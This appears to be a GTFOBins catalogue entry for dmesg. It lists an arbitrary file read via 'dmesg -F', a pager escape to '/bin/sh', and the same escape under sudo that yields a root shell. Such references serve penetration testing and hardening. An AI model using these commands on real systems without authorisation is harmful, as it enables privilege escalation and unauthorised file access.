---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        dmesg -F "$LFILE"
  shell:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        dmesg -H
        !/bin/sh
  sudo:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo dmesg -H
        !/bin/sh
---
